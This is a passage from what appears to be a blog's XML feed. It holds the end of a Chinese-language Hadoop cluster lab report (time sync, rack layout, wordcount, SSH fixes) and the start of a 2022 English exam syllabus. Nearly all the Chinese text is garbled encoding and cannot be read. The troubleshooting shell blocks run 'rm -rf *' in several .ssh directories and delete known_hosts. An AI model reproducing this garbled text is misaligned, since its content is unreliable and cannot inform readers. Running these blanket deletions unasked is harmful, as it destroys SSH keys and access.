<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop103 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[huang@hadoop103 ~]$ sudo systemctl disable ntpd</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ sudo crontab -e</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç¼–å†™å†…å®¹å¦‚ä¸‹</span></span><br><span class="line">*/1 * * * * /usr/sbin/ntpdate hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä»»æ„ä¿®æ”¹æœºå™¨æ—¶é—´</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date -s &quot;2021-9-9 11:11:11&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¸€åˆ†é’ŸåæŸ¥çœ‹</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date</span><br></pre></td></tr></table></figure>

<h2 id="ä¸‰ã€å®éªŒç»“æœ"><a href="#ä¸‰ã€å®éªŒç»“æœ" class="headerlink" title="ä¸‰ã€å®éªŒç»“æœ"></a>ä¸‰ã€å®éªŒç»“æœ</h2><h2 id="jpsallè„šæœ¬æŸ¥çœ‹9ä¸ªæœåŠ¡å™¨çš„çŠ¶æ€"><a href="#jpsallè„šæœ¬æŸ¥çœ‹9ä¸ªæœåŠ¡å™¨çš„çŠ¶æ€" class="headerlink" title="jpsallè„šæœ¬æŸ¥çœ‹9ä¸ªæœåŠ¡å™¨çš„çŠ¶æ€"></a>jpsallè„šæœ¬æŸ¥çœ‹9ä¸ªæœåŠ¡å™¨çš„çŠ¶æ€</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115387.png" alt="image-20210701175214061"></p>
<p>ä¸é›†ç¾¤è§„åˆ’ä¸€è‡´ï¼š</p>
<p><strong>MacBook Pro(Rack1):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th align="left">hadoop102</th>
<th align="left">hadoop109</th>
<th>hadoop110</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td align="left">NameNode DataNode</td>
<td align="left">DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td align="left">NodeManager</td>
<td align="left">NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-1(Rack2):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop103</th>
<th>hadoop107</th>
<th>hadoop108</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>ResourceManager NodeManger</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-2(Rack3):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop104</th>
<th>hadoop105</th>
<th>hadoop106</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>SecondaryNameNode DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>NodeManager</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<h2 id="9ä¸ªèŠ‚ç‚¹å‡ä¸ºæ¿€æ´»çŠ¶æ€"><a href="#9ä¸ªèŠ‚ç‚¹å‡ä¸ºæ¿€æ´»çŠ¶æ€" class="headerlink" title="9ä¸ªèŠ‚ç‚¹å‡ä¸ºæ¿€æ´»çŠ¶æ€"></a>9ä¸ªèŠ‚ç‚¹å‡ä¸ºæ¿€æ´»çŠ¶æ€</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115388.png" alt="æˆªå±2021-07-01 ä¸‹åˆ5.59.03 (2)"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115389.png" alt="æˆªå±2021-07-01 ä¸‹åˆ6.00.51 (2)"></p>
<h2 id="èŠ‚ç‚¹å‰¯æœ¬æ•°è®¾ç½®ä¸º9"><a href="#èŠ‚ç‚¹å‰¯æœ¬æ•°è®¾ç½®ä¸º9" class="headerlink" title="èŠ‚ç‚¹å‰¯æœ¬æ•°è®¾ç½®ä¸º9"></a>èŠ‚ç‚¹å‰¯æœ¬æ•°è®¾ç½®ä¸º9</h2><p>æ­¤æ—¶å‰¯æœ¬æ•°ä¸º9ä¸ª</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115390.png" alt="æˆªå±2021-07-01 ä¸‹åˆ6.02.08 (2)"></p>
<h2 id="æ‰§è¡Œwordcount"><a href="#æ‰§è¡Œwordcount" class="headerlink" title="æ‰§è¡Œwordcount"></a>æ‰§è¡Œwordcount</h2><p>word.txt:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115391.png" alt="image-20210701182926457"></p>
<p>æ‰§è¡Œï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115392.png" alt="æˆªå±2021-07-01 ä¸‹åˆ6.07.43 (2)"></p>
<p>æŸ¥çœ‹ç»“æœï¼š</p>
<p>ä»»åŠ¡å†å²ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115393.png" alt="æˆªå±2021-07-01 ä¸‹åˆ6.11.54 (2)"></p>
<p>æ—¥å¿—ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115394.png" alt="æˆªå±2021-07-01 ä¸‹åˆ6.12.27 (2)"></p>
<p>ç»“æœ3ä¸ªå‰¯æœ¬åœ¨hadoop106ï¼Œhadoop109ï¼Œhadoop5:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115395.png" alt="æˆªå±2021-07-01 ä¸‹åˆ6.20.19 (2)"></p>
<p>å»hadoop105,hadoop106,hadoop109æŸ¥çœ‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115396.png" alt="æˆªå±2021-07-01 ä¸‹åˆ6.27.12 (2)"></p>
<h2 id="å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•"><a href="#å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•" class="headerlink" title="å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•"></a>å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•</h2><h2 id="sshè¿ä¸ä¸Š"><a href="#sshè¿ä¸ä¸Š" class="headerlink" title="sshè¿ä¸ä¸Š"></a>sshè¿ä¸ä¸Š</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115397.png" alt="æˆªå±2021-07-01 ä¸‹åˆ2.16.19"></p>
<p>åŸå› ï¼šä¹‹å‰åœ¨æœ¬åœ°é…ç½®è¿‡sshæ— å¯†ç ç™»é™†ï¼Œç°åœ¨ipåœ°å€å˜äº†ï¼Œä¹‹å‰çš„hadoop103å·²ç»æ¢äº†ä¸»æœºï¼Œæ‰€ä»¥æ‰ä¼šç­‰ä¸ä¸Š</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">æŠŠ.sshæ–‡ä»¶å¤¹ä¸‹çš„ä¸œè¥¿éƒ½åˆ æ‰</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">mac</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro Documents % cd /Users/huangmingwang/.ssh </span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro .ssh % rm -rf known_hosts </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">hadoop102</span></span><br><span class="line">[huang@hadoop102 ~]$ cd .ssh</span><br><span class="line">[huang@hadoop102 .ssh]$ rm -rf *</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/.ssh</span><br><span class="line">[huang@hadoop102 .ssh]$ rm -rf *</span><br><span class="line"><span class="meta">#</span><span class="language-bash">hadoop103</span></span><br><span class="line">[huang@hadoop103 ~]$ cd .ssh</span><br><span class="line">[huang@hadoop103 .ssh]$ rm -rf *</span><br><span class="line"></span><br><span class="line">[huang@hadoop103 ~]$ cd /home/huang/.ssh</span><br><span class="line">[huang@hadoop103 .ssh]$ rm -rf *</span><br><span class="line"><span class="meta">#</span><span class="language-bash">hadoop104</span></span><br><span class="line">[huang@hadoop104 ~]$ cd .ssh</span><br><span class="line">[huang@hadoop104 .ssh]$ rm -rf *</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ cd /home/huang/.ssh</span><br><span class="line">[huang@hadoop104 .ssh]$ rm -rf *</span><br></pre></td></tr></table></figure>



<h2 id="Hadoop102-rootè´¦å·æ— å¯†ç ç™»é™†å…¶ä»–ä¸»æœºå¤±è´¥"><a href="#Hadoop102-rootè´¦å·æ— å¯†ç ç™»é™†å…¶ä»–ä¸»æœºå¤±è´¥" class="headerlink" title="Hadoop102 rootè´¦å·æ— å¯†ç ç™»é™†å…¶ä»–ä¸»æœºå¤±è´¥"></a>Hadoop102 rootè´¦å·æ— å¯†ç ç™»é™†å…¶ä»–ä¸»æœºå¤±è´¥</h2><p>åŸå› ï¼šåœ¨&#x2F;home&#x2F;huang&#x2F;.sshé…ç½®çš„æ— å¯†ç ç™»é™†ï¼Œåœ¨rootç”¨æˆ·ä¸‹ç”¨ä¸äº†</p>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<p>åœ¨è¿›å»rootæ ¹ç›®å½•ä¸‹çš„.sshè¿›è¡Œé…ç½®</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ç”Ÿæˆå…¬é’¥å’Œç§é’¥</span></span><br><span class="line">[huang@hadoop102 huang]$ cd /root/.ssh</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-keygen -t rsa</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŒ‰ä¸‰ä¸‹å›è½¦å°±ä¼šç”Ÿæˆrsaæ–‡ä»¶</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†å…¬é’¥æ‹·è´åˆ°è¦å…å¯†ç™»é™†çš„ç›®æ ‡æœºå™¨ä¸Š</span></span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop103</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop104</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop105</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop106</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop107</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop108</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop109</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop110</span><br></pre></td></tr></table></figure>

<h3 id="ä¿®æ”¹é…ç½®åé‡å¯æœåŠ¡å‘ç°DataNodeå’ŒNameNodeè¿›ç¨‹åªèƒ½é‡å¯ä¸€ä¸ª"><a href="#ä¿®æ”¹é…ç½®åé‡å¯æœåŠ¡å‘ç°DataNodeå’ŒNameNodeè¿›ç¨‹åªèƒ½é‡å¯ä¸€ä¸ª" class="headerlink" title="ä¿®æ”¹é…ç½®åé‡å¯æœåŠ¡å‘ç°DataNodeå’ŒNameNodeè¿›ç¨‹åªèƒ½é‡å¯ä¸€ä¸ª"></a>ä¿®æ”¹é…ç½®åé‡å¯æœåŠ¡å‘ç°DataNodeå’ŒNameNodeè¿›ç¨‹åªèƒ½é‡å¯ä¸€ä¸ª</h3><p>å› ä¸ºNameNodeåœ¨formatåˆå§‹åŒ–åä¼šç”ŸæˆclusterIdï¼ˆé›†ç¾¤IDï¼‰ï¼ŒDateNodeåœ¨å¯åŠ¨åä¼šç”Ÿæˆå’ŒNameNodeä¸€æ ·çš„clusterIdï¼ˆé›†ç¾¤IDï¼‰ï¼Œå†æ¬¡æ ¼å¼åŒ–NameNodeï¼Œç”Ÿæˆæ–°çš„clusteridï¼Œä¸æœªåˆ é™¤DataNodeçš„clusteridä¸ä¸€è‡´ï¼Œé›†ç¾¤æ‰¾ä¸åˆ°å·²å¾€æ•°æ®ã€‚</p>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<p>éœ€è¦é‡æ–°æ ¼å¼åŒ– NameNode çš„è¯ï¼Œ<strong>ä¸€å®šè¦å…ˆåœæ­¢æ‰€æœ‰æœºå™¨çš„NameNode å’Œ DataNode è¿›ç¨‹ï¼Œå¹¶ä¸”è¦åˆ é™¤æ‰€æœ‰æœºå™¨çš„ data å’Œ logs ç›®å½•ï¼Œç„¶åå†è¿›è¡Œæ ¼å¼åŒ–</strong>ã€‚</p>
<h2 id="xsyncè„šæœ¬åªèƒ½åŒæ­¥ä¿®æ”¹ï¼Œä¸èƒ½åˆ é™¤æ–‡ä»¶å¤¹"><a href="#xsyncè„šæœ¬åªèƒ½åŒæ­¥ä¿®æ”¹ï¼Œä¸èƒ½åˆ é™¤æ–‡ä»¶å¤¹" class="headerlink" title="xsyncè„šæœ¬åªèƒ½åŒæ­¥ä¿®æ”¹ï¼Œä¸èƒ½åˆ é™¤æ–‡ä»¶å¤¹"></a>xsyncè„šæœ¬åªèƒ½åŒæ­¥ä¿®æ”¹ï¼Œä¸èƒ½åˆ é™¤æ–‡ä»¶å¤¹</h2><p>hdfså¯åŠ¨å¤±è´¥åï¼Œåœ¨hadoopä¸Šåˆ é™¤dataå’Œlogsï¼Œç„¶åç”¨xsyncåŒæ­¥æ–‡ä»¶å¤¹ï¼Œæœ¬ä»¥ä¸ºå…¶ä»–ä¸»æœºä¹Ÿä¼šåŒæ­¥åˆ é™¤ï¼Œç„¶ååˆæ¥ç€æ ¼å¼NameNodeï¼Œé‡å¯é›†ç¾¤ï¼Œä½†è¿˜æ˜¯æœ‰å‡ ä¸ªdatanodeè¿ä¸ä¸Šï¼Œå› ä¸ºå…¶ä»–èŠ‚ç‚¹çš„dataæ•°æ®è¿˜åœ¨ï¼Œé€ æˆæ ¼å¼åŒ–åé›†ç¾¤idä¸ä¸€æ ·ï¼Œç„¶åè¿ä¸ä¸Š</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p>å»æ¯ä¸ªèŠ‚ç‚¹ä¸Šåˆ é™¤dataå’Œlogsæ–‡ä»¶å¤¹ï¼Œç„¶åå†æ ¼å¼åŒ–NameNodeï¼Œé‡å¯é›†ç¾¤å³å¯</p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>2022å¹´è€ƒç ”è‹±è¯­äºŒè€ƒè¯•å¤§çº²</title>
    <url>/2021/10/20/%E8%80%83%E7%A0%94/2022%E5%B9%B4%E8%80%83%E7%A0%94%E8%8B%B1%E8%AF%AD%E4%BA%8C%E8%80%83%E8%AF%95%E5%A4%A7%E7%BA%B2/</url>
    <content><![CDATA[<h1 id="2022å¹´è€ƒç ”è‹±è¯­äºŒè€ƒè¯•å¤§çº²"><a href="#2022å¹´è€ƒç ”è‹±è¯­äºŒè€ƒè¯•å¤§çº²" class="headerlink" title="2022å¹´è€ƒç ”è‹±è¯­äºŒè€ƒè¯•å¤§çº²"></a>2022å¹´è€ƒç ”è‹±è¯­äºŒè€ƒè¯•å¤§çº²</h1><blockquote>
<p>å¶çº¯å®å®ä¸“ç”¨ç‰ˆ</p>
</blockquote>
<p><strong>å…¨å›½ç¡•å£«ç ”ç©¶ç”Ÿæ‹›ç”Ÿè€ƒè¯•è‹±è¯­(äºŒ)è€ƒè¯•å¤§çº²(éè‹±è¯­ä¸“ä¸š)(2022å¹´ç‰ˆ)</strong></p>
<h2 id="I-è€ƒè¯•æ€§è´¨"><a href="#I-è€ƒè¯•æ€§è´¨" class="headerlink" title="I.è€ƒè¯•æ€§è´¨"></a><strong>I.è€ƒè¯•æ€§è´¨</strong></h2><p>è‹±è¯­(äºŒ)è€ƒè¯•ä¸»è¦æ˜¯ä¸ºé«˜ç­‰é™¢æ ¡å’Œç§‘ç ”é™¢æ‰€æ‹›æ”¶ä¸“ä¸šå­¦ä½ç¡•å£«ç ”ç©¶ç”Ÿè€Œè®¾ç½®çš„å…·æœ‰é€‰æ‹”æ€§è´¨çš„å…¨å›½ç»Ÿä¸€å…¥å­¦è€ƒè¯•ç§‘ç›®ã€‚å…¶ç›®çš„æ˜¯ç§‘å­¦ã€å…¬å¹³ã€æœ‰æ•ˆåœ°æµ‹è¯•è€ƒç”Ÿå¯¹è‹±è¯­è¯­è¨€çš„è¿ç”¨èƒ½åŠ›ï¼Œè¯„ä»·çš„æ ‡å‡†æ˜¯é«˜ç­‰å­¦æ ¡éè‹±è¯­ä¸“ä¸šæœ¬ç§‘æ¯•ä¸šç”Ÿæ‰€èƒ½è¾¾åˆ°çš„åŠæ ¼æˆ–åŠæ ¼ä»¥ä¸Šæ°´å¹³ï¼Œä»¥ä¿è¯è¢«å½•å–è€…å…·æœ‰ä¸€å®šçš„è‹±è¯­æ°´å¹³ï¼Œå¹¶æœ‰åˆ©äºå„é«˜ç­‰å­¦æ ¡å’Œç§‘ç ”é™¢æ‰€åœ¨ä¸“ä¸šä¸Šæ‹©ä¼˜é€‰æ‹”ã€‚</p>
<h2 id="II-è€ƒæŸ¥ç›®æ ‡"><a href="#II-è€ƒæŸ¥ç›®æ ‡" class="headerlink" title="II.è€ƒæŸ¥ç›®æ ‡"></a><strong>II.è€ƒæŸ¥ç›®æ ‡</strong></h2><p>è€ƒç”Ÿåº”æŒæ¡ä¸‹åˆ—è¯­è¨€çŸ¥è¯†å’ŒæŠ€èƒ½ï¼š</p>
<h3 id="ä¸€-è¯­è¨€çŸ¥è¯†"><a href="#ä¸€-è¯­è¨€çŸ¥è¯†" class="headerlink" title="(ä¸€)è¯­è¨€çŸ¥è¯†"></a>(ä¸€)è¯­è¨€çŸ¥è¯†</h3><p>1.è¯­æ³•çŸ¥è¯†</p>
<p>è€ƒç”Ÿåº”èƒ½ç†Ÿç»ƒåœ°è¿ç”¨åŸºæœ¬çš„è¯­æ³•çŸ¥è¯†ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š</p>
<p>(1)åè¯ã€ä»£è¯çš„æ•°å’Œæ ¼çš„æ„æˆåŠå…¶ç”¨æ³•;</p>
<p>(2)åŠ¨è¯æ—¶æ€ã€è¯­æ€çš„æ„æˆåŠå…¶ç”¨æ³•;</p>
<p>(3)å½¢å®¹è¯ä¸å‰¯è¯çš„æ¯”è¾ƒçº§å’Œæœ€é«˜çº§çš„æ„æˆåŠå…¶ç”¨æ³•;</p>
<p>(4)å¸¸ç”¨è¿æ¥è¯çš„è¯ä¹‰åŠå…¶ç”¨æ³•;</p>
<p>(5)éè°“è¯­åŠ¨è¯(ä¸å®šå¼ã€åŠ¨åè¯ã€åˆ†è¯)çš„æ„æˆåŠå…¶ç”¨æ³•;</p>
<p>(6)è™šæ‹Ÿè¯­æ°”çš„æ„æˆåŠå…¶ç”¨æ³•;</p>
<p>(7)å„ç±»ä»å¥(å®šè¯­ä»å¥ã€ä¸»è¯­ä»å¥ã€è¡¨è¯­ä»å¥ç­‰)åŠå¼ºè°ƒå¥å‹çš„ç»“æ„åŠå…¶ç”¨æ³•;</p>
<p>(8)å€’è£…å¥ã€æ’å…¥è¯­çš„ç»“æ„åŠå…¶ç”¨æ³•ã€‚</p>
<p>2.è¯æ±‡</p>
<p>è€ƒç”Ÿåº”èƒ½è¾ƒç†Ÿç»ƒåœ°æŒæ¡5500ä¸ªå·¦å³å¸¸ç”¨è‹±è¯­è¯æ±‡ä»¥åŠç›¸å…³å¸¸ç”¨è¯ç»„(è¯¦è§é™„å½•ç›¸å…³éƒ¨åˆ†)ã€‚è€ƒç”Ÿåº”èƒ½æ ¹æ®å…·ä½“è¯­å¢ƒã€å¥å­ç»“æ„æˆ–ä¸Šä¸‹æ–‡ç†è§£ä¸€äº›éå¸¸ç”¨è¯çš„è¯ä¹‰ã€‚</p>
<h3 id="äºŒ-è¯­è¨€æŠ€èƒ½"><a href="#äºŒ-è¯­è¨€æŠ€èƒ½" class="headerlink" title="(äºŒ)è¯­è¨€æŠ€èƒ½"></a>(äºŒ)è¯­è¨€æŠ€èƒ½</h3><p>1.é˜…è¯»</p>
<p>è€ƒç”Ÿåº”èƒ½è¯»æ‡‚ä¸åŒé¢˜æå’Œä½“è£çš„æ–‡å­—ææ–™ã€‚é¢˜æåŒ…æ‹¬ç»æµã€ç®¡ç†ã€ç¤¾ä¼šã€æ–‡åŒ–ã€ç§‘æ™®ç­‰ï¼Œä½“è£åŒ…æ‹¬è¯´æ˜æ–‡ã€è®®è®ºæ–‡å’Œè®°å™æ–‡ç­‰ã€‚</p>
<p>æ ¹æ®é˜…è¯»ææ–™ï¼Œè€ƒç”Ÿåº”èƒ½ï¼š</p>
<p>(1)ç†è§£ä¸»æ—¨è¦ä¹‰;</p>
<p>(2)ç†è§£æ–‡ä¸­çš„å…·ä½“ä¿¡æ¯;</p>
<p>(3)ç†è§£è¯­ç¯‡çš„ç»“æ„å’Œä¸Šä¸‹æ–‡çš„é€»è¾‘å…³ç³»;</p>
<p>(4)æ ¹æ®ä¸Šä¸‹æ–‡æ¨æ–­é‡è¦ç”Ÿè¯æˆ–è¯ç»„çš„å«ä¹‰;</p>
<p>(5)è¿›è¡Œä¸€å®šçš„åˆ¤æ–­å’Œæ¨ç†;</p>
<p>(6)ç†è§£ä½œè€…çš„æ„å›¾ã€è§‚ç‚¹æˆ–æ€åº¦;</p>
<p>(7)ç†è§£æ–‡ç« çš„è®ºè¯æ–¹æ³•ï¼Œæ¯”è¾ƒä¸åŒè§‚ç‚¹ã€‚</p>
<p>2.å†™ä½œ</p>
<p>è€ƒç”Ÿåº”èƒ½æ ¹æ®æ‰€ç»™çš„æçº²ã€æƒ…æ™¯æˆ–è¦æ±‚å®Œæˆç›¸åº”çš„çŸ­æ–‡å†™ä½œã€‚çŸ­æ–‡åº”ä¸­å¿ƒæ€æƒ³æ˜ç¡®ã€åˆ‡ä¸­é¢˜æ„ã€ç»“æ„æ¸…æ™°ã€æ¡ç†æ¸…æ¥šã€ç”¨è¯æ°å½“ã€æ— æ˜æ˜¾è¯­è¨€é”™è¯¯ã€‚</p>
<h2 id="III-è€ƒè¯•å½¢å¼ã€è€ƒè¯•å†…å®¹ä¸è¯•å·ç»“æ„"><a href="#III-è€ƒè¯•å½¢å¼ã€è€ƒè¯•å†…å®¹ä¸è¯•å·ç»“æ„" class="headerlink" title="III.è€ƒè¯•å½¢å¼ã€è€ƒè¯•å†…å®¹ä¸è¯•å·ç»“æ„"></a><strong>III.è€ƒè¯•å½¢å¼ã€è€ƒè¯•å†…å®¹ä¸è¯•å·ç»“æ„</strong></h2><h3 id="ä¸€-è€ƒè¯•å½¢å¼"><a href="#ä¸€-è€ƒè¯•å½¢å¼" class="headerlink" title="(ä¸€)è€ƒè¯•å½¢å¼"></a><strong>(ä¸€)è€ƒè¯•å½¢å¼</strong></h3><p>è€ƒè¯•å½¢å¼ä¸ºç¬”è¯•ã€‚è€ƒè¯•æ—¶é—´ä¸º180åˆ†é’Ÿã€‚æ»¡åˆ†ä¸º100åˆ†ã€‚</p>
<p>è¯•å·åŒ…æ‹¬è¯•é¢˜å†Œå’Œ1å¼ ç­”é¢˜å¡ã€‚è€ƒç”Ÿåº”å°†è‹±è¯­çŸ¥è¯†è¿ç”¨å’Œé˜…è¯»ç†è§£éƒ¨åˆ†çš„ç­”æ¡ˆæŒ‰è¦æ±‚æ¶‚å†™åœ¨ç­”é¢˜å¡ç›¸åº”é¢˜å·çš„é€‰é¡¹ä¸Šï¼Œå°†ç¿»è¯‘å’Œå†™ä½œéƒ¨åˆ†çš„ç­”æ¡ˆä¹¦å†™åœ¨ç­”é¢˜å¡æŒ‡å®šä½ç½®çš„è¾¹æ¡†åŒºåŸŸå†…ã€‚</p>
<h3 id="äºŒ-è€ƒè¯•å†…å®¹"><a href="#äºŒ-è€ƒè¯•å†…å®¹" class="headerlink" title="(äºŒ)è€ƒè¯•å†…å®¹"></a><strong>(äºŒ)è€ƒè¯•å†…å®¹</strong></h3><p>è¯•é¢˜åˆ†å››éƒ¨åˆ†ï¼Œå…±48é¢˜ï¼ŒåŒ…æ‹¬è‹±è¯­çŸ¥è¯†è¿ç”¨ã€é˜…è¯»ç†è§£ã€ç¿»è¯‘å’Œå†™ä½œã€‚</p>
<h4 id="ç¬¬ä¸€éƒ¨åˆ†-è‹±è¯­çŸ¥è¯†è¿ç”¨"><a href="#ç¬¬ä¸€éƒ¨åˆ†-è‹±è¯­çŸ¥è¯†è¿ç”¨" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ† è‹±è¯­çŸ¥è¯†è¿ç”¨"></a>ç¬¬ä¸€éƒ¨åˆ† è‹±è¯­çŸ¥è¯†è¿ç”¨</h4><p>ä¸»è¦è€ƒæŸ¥è€ƒç”Ÿå¯¹è‹±è¯­çŸ¥è¯†çš„ç»¼åˆè¿ç”¨èƒ½åŠ›ã€‚å…±20å°é¢˜ï¼Œæ¯å°é¢˜0.5åˆ†ï¼Œå…±10åˆ†ã€‚</p>
<p>åœ¨ä¸€ç¯‡çº¦350è¯çš„æ–‡ç« ä¸­ç•™å‡º20ä¸ªç©ºç™½ï¼Œè¦æ±‚è€ƒç”Ÿä»æ¯é¢˜ç»™å‡ºçš„4ä¸ªé€‰é¡¹ä¸­é€‰å‡ºæœ€ä½³ç­”æ¡ˆï¼Œä½¿è¡¥å…¨åçš„æ–‡ç« æ„æ€é€šé¡ºã€å‰åè¿è´¯ã€ç»“æ„å®Œæ•´ã€‚</p>
<h4 id="ç¬¬äºŒéƒ¨åˆ†-é˜…è¯»ç†è§£"><a href="#ç¬¬äºŒéƒ¨åˆ†-é˜…è¯»ç†è§£" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ† é˜…è¯»ç†è§£"></a>ç¬¬äºŒéƒ¨åˆ† é˜…è¯»ç†è§£</h4><p>ä¸»è¦è€ƒæŸ¥è€ƒç”Ÿè·å–ä¿¡æ¯ã€ç†è§£æ–‡ç« ã€çŒœæµ‹é‡è¦ç”Ÿè¯è¯ä¹‰å¹¶è¿›è¡Œæ¨æ–­ç­‰æ–¹é¢çš„èƒ½åŠ›ã€‚è¯¥éƒ¨åˆ†ç”±Aã€Bä¸¤èŠ‚ç»„æˆï¼Œå…±25å°é¢˜ï¼Œæ¯å°é¢˜2åˆ†ï¼Œå…±50åˆ†ã€‚</p>
<p>AèŠ‚(20å°é¢˜)</p>
<p>æœ¬éƒ¨åˆ†ä¸ºå¤šé¡¹é€‰æ‹©é¢˜ã€‚å…±å››ç¯‡æ–‡ç« ï¼Œæ€»é•¿åº¦ä¸º1500~1600è¯ã€‚è¦æ±‚è€ƒç”Ÿé˜…è¯»æ–‡ç« å¹¶å›ç­”æ¯ç¯‡æ–‡ç« åé¢çš„é—®é¢˜ã€‚è€ƒç”Ÿéœ€è¦åœ¨æ¯å°é¢˜æ‰€æä¾›çš„é€‰é¡¹(Aã€Bã€Cã€D)ä¸­é€‰å‡ºå”¯ä¸€æ­£ç¡®æˆ–æ˜¯æœ€åˆé€‚çš„ç­”æ¡ˆã€‚</p>
<p>æ¯ç¯‡æ–‡ç« è®¾5é¢˜ï¼Œå…±20é¢˜ã€‚æ¯å°é¢˜2åˆ†ï¼Œå…±40åˆ†ã€‚</p>
<p>BèŠ‚(5å°é¢˜)</p>
<p>æœ¬èŠ‚æœ‰ä¸¤ç§å¤‡é€‰é¢˜å‹ã€‚æ¯æ¬¡è€ƒè¯•ä»è¿™ä¸¤ç§é¢˜å‹ä¸­é€‰æ‹©å…¶ä¸­çš„ä¸€ç§å½¢å¼ï¼Œæˆ–è€…ä¸¤ç§å½¢å¼çš„ç»„åˆè¿›è¡Œè€ƒæŸ¥ã€‚</p>
<p>æœ¬èŠ‚æ–‡ç« è®¾5å°é¢˜ï¼Œæ¯å°é¢˜2åˆ†ï¼Œå…±10åˆ†ã€‚</p>
<p>å¤‡é€‰é¢˜å‹åŒ…æ‹¬ï¼š</p>
<p>1)å¤šé¡¹å¯¹åº”</p>
<p>æœ¬èŠ‚ä¸ºä¸€ç¯‡é•¿åº¦ä¸º450~550è¯çš„æ–‡ç« ï¼Œè¯•é¢˜å†…å®¹åˆ†ä¸ºå·¦å³ä¸¤æ ï¼Œå·¦ä¾§ä¸€æ ä¸º5é“é¢˜ç›®ï¼Œå³ä¾§ä¸€æ ä¸º7ä¸ªé€‰é¡¹ã€‚è¦æ±‚è€ƒç”Ÿåœ¨é˜…è¯»åæ ¹æ®æ–‡ç« å†…å®¹å’Œå·¦ä¾§ä¸€æ ä¸­æä¾›çš„ä¿¡æ¯ä»å³ä¾§ä¸€æ ä¸­çš„7ä¸ªé€‰é¡¹ä¸­é€‰å‡ºå¯¹åº”çš„5é¡¹ç›¸å…³ä¿¡æ¯ã€‚</p>
<p>2)å°æ ‡é¢˜å¯¹åº”</p>
